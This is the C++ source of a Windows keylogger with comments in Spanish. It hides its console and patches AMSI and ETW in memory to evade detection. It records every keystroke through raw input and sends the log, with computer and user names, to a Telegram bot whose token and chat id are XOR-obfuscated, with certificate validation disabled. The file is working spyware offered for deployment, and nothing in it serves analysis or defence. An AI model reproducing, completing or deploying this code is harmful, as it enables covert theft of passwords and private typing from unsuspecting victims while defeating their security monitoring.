#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "wininet.lib")

using namespace std;

#define XOR_KEY 0xAA

mutex g_mtx;
vector<BYTE> g_buffer;
int g_enterCount = 0;
int g_totalKeystrokes = 0;
bool g_running = true;
bool g_shouldReport = false;
//cambiar datos de telegram, ofuscar con python
unsigned char obf_token[] = { 0x6d, 0x63, 0x60, 0x6c, 0x61, 0x6d, 0x64, 0x63, 0x61, 0x66, 0x6f, 0x14, 0x14, 0x12, 0x1e, 0x20, 0xa, 0xd, 0x1d, 0x1b, 0x33, 0x78, 0x22, 0x1a, 0x5, 0x24, 0x16, 0x1f, 0x31, 0x2, 0x2, 0x0, 0x1b, 0x31, 0x33, 0x65, 0x6, 0x17, 0x27, 0x21, 0x67, 0x61, 0x39, 0x65, 0x0, 0x36 };
unsigned char obf_chat[] = { 0x62, 0x66, 0x63, 0x6c, 0x6d, 0x60, 0x65, 0x61, 0x66, 0x60 };

string Deobf(unsigned char* data, size_t len) {
    string result;
    for (size_t i = 0; i < len; i++) result += data[i] ^ 0x55;
    return result;
}

void BypassAMSI() {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return;
    void* p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return;
    DWORD old;
    if (VirtualProtect(p, 32, PAGE_EXECUTE_READWRITE, &old)) {
        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
        memcpy(p, patch, 3);
        VirtualProtect(p, 32, old, &old);
    }
}

void BypassETW() {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return;
    void* p = GetProcAddress(h, "EtwEventWrite");
    if (!p) return;
    DWORD old;
    if (VirtualProtect(p, 32, PAGE_EXECUTE_READWRITE, &old)) {
        BYTE patch[] = { 0xC2, 0x14, 0x00 };
        memcpy(p, patch, 3);
        VirtualProtect(p, 32, old, &old);
    }
}

//keylogger
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg != WM_INPUT) return DefWindowProc(hwnd, msg, wParam, lParam);

    UINT size = 0;
    GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &size, sizeof(RAWINPUTHEADER));
    if (!size) return 0;

    vector<BYTE> buf(size);
    if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buf.data(), &size, sizeof(RAWINPUTHEADER)) != size)
        return 0;

    RAWINPUT* raw = (RAWINPUT*)buf.data();
    if (raw->header.dwType != RIM_TYPEKEYBOARD) return 0;
    if (raw->data.keyboard.Flags & RI_KEY_BREAK) return 0;

    USHORT vk = raw->data.keyboard.VKey;
    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    bool caps = (GetKeyState(VK_CAPITAL) & 0x01) != 0;

    string key;
    bool isEnter = false;

    if (vk == VK_BACK || vk == VK_TAB || vk == VK_ESCAPE) {
        return 0;
    }

    if (vk >= '0' && vk <= '9') {
        key = shift ? string(1, ")!@#$%^&*("[vk - '0']) : string(1, (char)vk);
    }
    else if (vk >= 'A' && vk <= 'Z') {
        bool upper = shift ^ caps;
        key = string(1, upper ? (char)vk : (char)(vk + 32));
    }
    else if (vk == VK_RETURN) {
        key = "\n";
        isEnter = true;
    }
    else if (vk == VK_SPACE) {
        key = " ";
    }
    else {
        // Caracteres especiales
        if (shift) {
            switch (vk) {
            case VK_OEM_1: key = ":"; break;
            case VK_OEM_2: key = "?"; break;
            case VK_OEM_3: key = "~"; break;
            case VK_OEM_4: key = "{"; break;
            case VK_OEM_5: key = "|"; break;
            case VK_OEM_6: key = "}"; break;
            case VK_OEM_7: key = "\""; break;
            case VK_OEM_COMMA: key = "<"; break;
            case VK_OEM_PERIOD: key = ">"; break;
            case VK_OEM_MINUS: key = "_"; break;
            case VK_OEM_PLUS: key = "+"; break;
            }
        }
        else {
            switch (vk) {
            case VK_OEM_1: key = ";"; break;
            case VK_OEM_2: key = "/"; break;
            case VK_OEM_3: key = "`"; break;
            case VK_OEM_4: key = "["; break;
            case VK_OEM_5: key = "\\"; break;
            case VK_OEM_6: key = "]"; break;
            case VK_OEM_7: key = "'"; break;
            case VK_OEM_COMMA: key = ","; break;
            case VK_OEM_PERIOD: key = "."; break;
            case VK_OEM_MINUS: key = "-"; break;
            case VK_OEM_PLUS: key = "="; break;
            }
        }
    }

    if (!key.empty()) {
        lock_guard<mutex> lock(g_mtx);
        for (char c : key) g_buffer.push_back(c ^ XOR_KEY);
        g_totalKeystrokes++;

        if (isEnter) {
            g_enterCount++;
            if (g_enterCount >= 3 || g_buffer.size() > 2000) {
                g_shouldReport = true;
                g_enterCount = 0;
            }
        }

        if (g_buffer.size() > 4000) {
            g_shouldReport = true;
        }
    }
    return 0;
}

bool InitKeylog() {
    WNDCLASSEXW wc = { sizeof(wc) };
    wc.lpfnWndProc = WndProc;
    wc.lpszClassName = L"InputClass";

    if (!RegisterClassExW(&wc)) return false;

    HWND hwnd = CreateWindowExW(0, L"InputClass", NULL, 0, 0, 0, 0, 0,
        HWND_MESSAGE, NULL, NULL, NULL);
    if (!hwnd) return false;

    RAWINPUTDEVICE rid = { 0x01, 0x06, RIDEV_INPUTSINK | RIDEV_NOLEGACY, hwnd };
    return RegisterRawInputDevices(&rid, 1, sizeof(rid));
}

string UrlEnc(const string& s) {
    ostringstream o;
    o << hex << uppercase;
    for (unsigned char c : s) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~')
            o << c;
        else if (c == ' ')
            o << '+';
        else
            o << '%' << setw(2) << (int)c;
    }
    return o.str();
}

bool SendData() {
    vector<BYTE> data;
    string msg;

    {
        lock_guard<mutex> lock(g_mtx);
        if (g_buffer.empty()) return false;

        for (BYTE b : g_buffer) data.push_back(b ^ XOR_KEY);

        wchar_t pc[256] = { 0 }, user[256] = { 0 };
        DWORD len = 256;
        GetComputerNameW(pc, &len);
        len = 256;
        GetUserNameW(user, &len);

        char pcA[256], userA[256];
        WideCharToMultiByte(CP_UTF8, 0, pc, -1, pcA, 256, NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, user, -1, userA, 256, NULL, NULL);

        msg = "PC: " + string(pcA) + " | User: " + string(userA) + "\n";
        msg += "Teclas: " + to_string(g_totalKeystrokes) + "\n\n";
        msg += "Log:\n" + string(data.begin(), data.end());

        g_buffer.clear();
        g_shouldReport = false;
    }

    string tok = Deobf(obf_token, sizeof(obf_token));
    string chat = Deobf(obf_chat, sizeof(obf_chat));

    if (msg.empty() || tok.empty() || chat.empty()) return false;

    HINTERNET hInt = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInt) return false;

    HINTERNET hConn = InternetConnectA(hInt, "api.telegram.org",
        INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        InternetCloseHandle(hInt);
        return false;
    }

    string path = "/bot" + tok + "/sendMessage";

    string encodedMsg;
    for (char c : msg) {
        if (c == '\n') {
            encodedMsg += "%0A"; // Salto de línea en URL encoding
        }
        else if (c == ' ') {
            encodedMsg += "+";
        }
        else if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encodedMsg += c;
        }
        else {
            char buf[4];
            sprintf(buf, "%%%02X", (unsigned char)c);
            encodedMsg += buf;
        }
    }

    string body = "chat_id=" + chat + "&text=" + encodedMsg;

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path.c_str(),
        NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hReq) {
        InternetCloseHandle(hConn);
        InternetCloseHandle(hInt);
        return false;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    BOOL sent = HttpSendRequestA(hReq,
        "Content-Type: application/x-www-form-urlencoded\r\n", -1,
        (LPVOID)body.c_str(), (DWORD)body.length());

    if (sent) {
        char buf[4096];
        DWORD r = 0;
        while (InternetReadFile(hReq, buf, sizeof(buf), &r) && r) r = 0;
    }

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInt);

    return sent;
}

void Sender() {
    Sleep(5000);

    {
        lock_guard<mutex> lock(g_mtx);
        g_shouldReport = true;
    }
    SendData();

    while (g_running) {
        Sleep(5000);

        bool shouldSend = false;
        {
            lock_guard<mutex> lock(g_mtx);
            shouldSend = g_shouldReport;
        }

        if (shouldSend) {
            SendData();
        }
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    FreeConsole();

    BypassAMSI();
    BypassETW();

    if (!InitKeylog()) return 1;

    thread t1(Sender);
    t1.detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    g_running = false;
    return 0;
}